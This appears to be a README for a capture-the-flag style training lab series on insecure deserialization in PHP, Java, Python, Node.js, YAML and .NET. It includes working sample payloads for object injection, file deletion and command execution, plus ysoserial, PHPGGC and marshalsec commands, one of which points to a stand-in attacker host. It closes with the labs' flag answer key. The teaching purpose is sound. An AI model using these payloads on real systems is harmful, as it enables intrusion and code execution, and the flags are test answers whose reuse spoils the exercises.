# Insecure Deserialization Labs

Master deserialization attacks from basic object manipulation to remote code execution across multiple languages and frameworks.

## What is Insecure Deserialization?

Insecure deserialization occurs when an application deserializes data from untrusted sources without proper validation. Serialization converts objects into a format that can be stored or transmitted, while deserialization reconstructs objects from that data. When attackers can manipulate serialized data, they can exploit the deserialization process.

Insecure deserialization can lead to:
- Remote Code Execution (RCE)
- Privilege escalation
- Authentication bypass
- Denial of Service (DoS)
- Data tampering
- Object injection attacks

## How Deserialization Attacks Work

### Attack Flow

1. **Application serializes objects** for storage/transmission
2. **Attacker intercepts or creates** malicious serialized data
3. **Attacker modifies object properties** or injects malicious objects
4. **Application deserializes** the modified data
5. **Malicious code executes** during or after deserialization

### Common Serialization Formats

| Format | Language | Example |
|--------|----------|---------|
| PHP serialize | PHP | `O:4:"User":1:{s:4:"name";s:5:"admin";}` |
| Java ObjectInputStream | Java | Base64 encoded binary |
| Python serialization | Python | Binary or Base64 |
| JSON | Multiple | `{"user":"admin"}` |
| YAML | Multiple | `!!python/object:...` |
| .NET BinaryFormatter | C# | Binary data |

## Types of Deserialization Attacks

### 1. Object Property Manipulation
Modifying object properties to change application behavior

### 2. Gadget Chain Attacks
Chaining existing classes to achieve code execution

### 3. Type Confusion
Exploiting type checking weaknesses during deserialization

### 4. Magic Method Exploitation
Triggering dangerous methods like __wakeup(), __destruct()

## Lab Series

### Lab 1: PHP Object Injection
**Difficulty:** Beginner | **Duration:** 45 min | **Target:** bWAPP, Custom

Learn PHP deserialization:
- Understanding serialize/unserialize
- Manipulating object properties
- Exploiting magic methods
- POP chain basics

### Lab 2: Java Deserialization
**Difficulty:** Advanced | **Duration:** 1.5 hr | **Target:** WebGoat

Java ObjectInputStream attacks:
- Understanding Java serialization
- Using ysoserial for payload generation
- Common gadget chains (CommonsCollections, etc.)
- RCE via deserialization

### Lab 3: Python Deserialization
**Difficulty:** Intermediate | **Duration:** 1 hr | **Target:** Custom

Python serialization attacks:
- Understanding Python object serialization
- Creating malicious payloads
- Code execution via __reduce__
- Bypassing restrictions

### Lab 4: Node.js Deserialization
**Difficulty:** Intermediate | **Duration:** 45 min | **Target:** Juice Shop

JavaScript object injection:
- node-serialize vulnerabilities
- IIFE exploitation
- Prototype pollution via deserialization

### Lab 5: YAML Deserialization
**Difficulty:** Advanced | **Duration:** 1 hr | **Target:** Custom

YAML parser attacks:
- PyYAML unsafe loading
- Ruby YAML exploitation
- SnakeYAML gadgets

### Lab 6: .NET Deserialization
**Difficulty:** Advanced | **Duration:** 1.5 hr | **Target:** Custom

.NET Framework attacks:
- BinaryFormatter exploitation
- ViewState deserialization
- ysoserial.net usage

## Basic Payloads

### PHP Object Injection

```php
// Vulnerable class
class User {
    public $username;
    public $isAdmin = false;
}

// Malicious serialized object
O:4:"User":2:{s:8:"username";s:5:"admin";s:7:"isAdmin";b:1;}
```

### PHP Magic Methods

```php
// Class with dangerous __destruct
class FileDelete {
    public $filename;
    function __destruct() {
        unlink($this->filename);
    }
}

// Payload to delete /tmp/important
O:10:"FileDelete":1:{s:8:"filename";s:14:"/tmp/important";}
```

### Python Deserialization RCE

```python
# Vulnerable pattern - using unsafe deserialization
# The __reduce__ method allows arbitrary code execution
import base64
import subprocess

class MaliciousPayload:
    def __reduce__(self):
        # Returns tuple: (callable, args)
        return (subprocess.call, (['id'],))

# Generate base64 payload using Python's serialization module
```

### Node.js node-serialize

```javascript
// Malicious serialized object with IIFE
{"rce":"_$$ND_FUNC$$_function(){require('child_process').spawn('id')}()"}
```

## Tools

```bash
# ysoserial - Java deserialization payloads
java -jar ysoserial.jar CommonsCollections1 'id' | base64

# ysoserial.net - .NET deserialization payloads
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "calc"

# PHPGGC - PHP Generic Gadget Chains
phpggc Laravel/RCE1 system id

# Marshalsec - Java unmarshaller exploitation
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker/exploit"
```

## Identifying Serialized Data

### PHP Serialized

```
O:4:"User":1:{s:4:"name";s:5:"admin";}
a:2:{i:0;s:3:"foo";i:1;s:3:"bar";}
```

Starts with: `O:` (object), `a:` (array), `s:` (string), `i:` (integer)

### Java Serialized

```
rO0AB... (Base64)
AC ED 00 05 (hex magic bytes)
```

### Python Serialized

```
gASV... (Base64 protocol 4)
\x80\x04\x95... (raw bytes)
```

### .NET BinaryFormatter

```
AAEAAAD/////... (Base64)
00 01 00 00 00 FF FF FF FF (hex)
```

## Defense Techniques (Know Your Enemy)

Understanding defenses helps identify weaknesses:

1. **Avoid Native Deserialization** - Use safe formats like JSON
2. **Input Validation** - Validate before deserializing
3. **Type Whitelisting** - Only allow expected classes
4. **Integrity Checks** - Sign serialized data
5. **Sandboxing** - Isolate deserialization process
6. **Update Libraries** - Patch known gadget chains

## Flags

| Lab | Flag |
|-----|------|
| Lab 1 - PHP Object Injection | `FLAG{php_0bj3ct_1nj3ct10n}` |
| Lab 2 - Java Deserialization | `FLAG{j4v4_g4dg3t_ch41n}` |
| Lab 3 - Python Deserialization | `FLAG{pyth0n_rc3_pwn3d}` |
| Lab 4 - Node.js | `FLAG{n0d3_d3s3r14l1z3}` |
| Lab 5 - YAML | `FLAG{y4ml_uns4f3_l04d}` |
| Lab 6 - .NET | `FLAG{d0tn3t_b1n4ry_rc3}` |

## OWASP References

- [OWASP Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
- [OWASP A8:2017 Insecure Deserialization](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/16-Testing_for_HTTP_Incoming_Requests)
- [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)

## Additional Resources

- [PortSwigger Deserialization](https://portswigger.net/web-security/deserialization)
- [PayloadsAllTheThings Deserialization](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization)
- [HackTricks Deserialization](https://book.hacktricks.xyz/pentesting-web/deserialization)
- [ysoserial GitHub](https://github.com/frohoff/ysoserial)
- [PHPGGC GitHub](https://github.com/ambionics/phpggc)
